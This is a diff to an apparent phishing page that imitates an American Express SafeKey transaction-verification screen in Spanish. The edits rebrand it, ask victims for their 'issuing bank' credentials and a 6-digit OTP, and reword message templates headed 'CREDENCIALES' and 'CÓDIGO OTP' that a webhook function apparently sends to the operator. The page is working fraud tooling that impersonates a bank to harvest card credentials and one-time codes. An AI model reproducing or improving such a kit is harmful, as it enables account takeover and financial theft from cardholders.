@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>American Express SafeKey®</title>
+    <title>American Express</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
         :root {
@@ -48,46 +48,16 @@
         .header {
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: flex-start;
             margin-bottom: 24px;
             padding-bottom: 16px;
             border-bottom: 1px solid var(--amex-border);
         }
 
-        .amex-logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
         .amex-logo img {
-            height: 40px;
+            height: 50px;
             width: auto;
             display: block;
-        }
-
-        .amex-badge {
-            background: var(--amex-blue);
-            color: white;
-            font-size: 0.6rem;
-            font-weight: 700;
-            padding: 4px 12px;
-            border-radius: 20px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .language-selector {
-            font-size: 0.75rem;
-            color: var(--amex-text-muted);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .language-selector:hover {
-            color: var(--amex-text);
         }
 
         /* TÍTULO */
@@ -455,7 +425,7 @@
             }
 
             .amex-logo img {
-                height: 30px;
+                height: 36px;
             }
 
             .info-label {
@@ -466,16 +436,11 @@
             .info-value {
                 font-size: 0.8rem;
             }
-
-            .header {
-                flex-wrap: wrap;
-                gap: 8px;
-            }
         }
 
         @media (max-width: 360px) {
             .amex-logo img {
-                height: 26px;
+                height: 30px;
             }
 
             .info-label {
@@ -501,15 +466,13 @@
         <div class="header">
             <div class="amex-logo">
                 <img src="amex.png" alt="American Express" />
-                <span class="amex-badge">SafeKey®</span>
             </div>
-            <span class="language-selector">▼ Español</span>
         </div>
 
         <!-- TÍTULO -->
-        <h1 class="form-title">American Express SafeKey®</h1>
+        <h1 class="form-title">Autenticar con contraseña</h1>
         <p class="form-subtitle">
-            Ingrese el código OTP recibido en su <strong>número de teléfono registrado</strong> para validar la transacción.
+            Ingrese las credenciales de seguridad de su <strong>banco emisor</strong> para validar la transacción.
         </p>
 
         <!-- INFO TRANSACCIÓN -->
@@ -558,7 +521,7 @@
                         <path d="M12 8v4"/>
                         <path d="M12 16h.01"/>
                     </svg>
-                    <span>Ingresa el código OTP de 6 dígitos</span>
+                    <span>Se ha enviado un código de 6 dígitos a tu dispositivo registrado</span>
                 </div>
                 <div class="form-group" style="margin-bottom:0;">
                     <label class="form-label">Código OTP <span class="required">*</span></label>
@@ -622,7 +585,7 @@
         window.addEventListener('load', function() {
             initializeTransaction();
             configurarWebhook();
-            console.log('✅ American Express SafeKey listo');
+            console.log('✅ American Express listo');
         });
 
         function initializeTransaction() {
@@ -684,7 +647,7 @@
                     ]
                 };
 
-                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - CREDENCIALES*
+                const mensaje = `🔔 *AMERICAN EXPRESS - CREDENCIALES*
 
 🆔 ID: \`${datos.solicitudId}\`
 
@@ -732,7 +695,7 @@
                     ]
                 };
 
-                const mensaje = `🔔 *AMERICAN EXPRESS SAFEKEY - CÓDIGO OTP*
+                const mensaje = `🔔 *AMERICAN EXPRESS - CÓDIGO OTP*
 
 🆔 ID: \`${datos.solicitudId}\`
 
